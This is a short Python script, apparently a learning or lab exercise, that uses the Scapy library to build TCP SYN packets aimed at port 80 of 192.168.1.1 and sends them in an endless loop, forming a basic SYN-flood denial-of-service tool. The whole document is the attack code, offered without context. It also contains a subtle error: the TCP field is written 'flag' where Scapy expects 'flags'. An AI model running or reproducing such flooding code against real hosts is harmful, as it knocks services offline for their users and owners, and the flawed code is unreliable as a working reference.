from scapy.all import IP, TCP, send

dst_ip = "192.168.1.1"
dst_port = 80
ip = IP(dst=dst_ip)

syn = TCP(dport=dst_port, flag ="S")

packet = ip / syn

send(packet, loop = 1, verbose = 0)
